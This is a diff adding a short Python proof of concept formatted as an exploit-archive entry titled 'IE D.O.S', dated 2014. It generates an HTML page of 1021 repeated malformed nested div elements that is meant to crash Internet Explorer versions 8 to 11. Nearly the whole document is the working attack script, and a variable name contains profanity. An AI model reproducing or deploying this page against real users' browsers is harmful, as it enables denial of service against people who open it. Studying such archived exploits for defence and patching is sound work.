@@ -1,0 +1,17 @@
+# Exploit Title: [ IE D.O.S ]
+# Date: [10/28/2014]
+# Exploit Author: [Behrooz Abbassi]
+# Vendor Homepage: [http://microsoft.com]
+# Software Link: [http://windows.microsoft.com/en-us/internet-explorer/download-ie]
+# Version: [tested on 8 to 11]
+# Tested on: [XP to 8.1 x64/x86]
+
+FuckIE="""<!DOCTYPE html>\n<html>\n<head><title>IE D.O.S</title>\n</head>\n<body>\n %s </body>\n</html>\n"""
+
+rubbish  = """	<div class="First"><div class="Two"/> :-)<div class="Three"> </div>\n""" * 1021
+
+IE_DOS =FuckIE %rubbish
+
+file = open("IE_DOS.html", "w")
+file.write(IE_DOS)
+file.close()
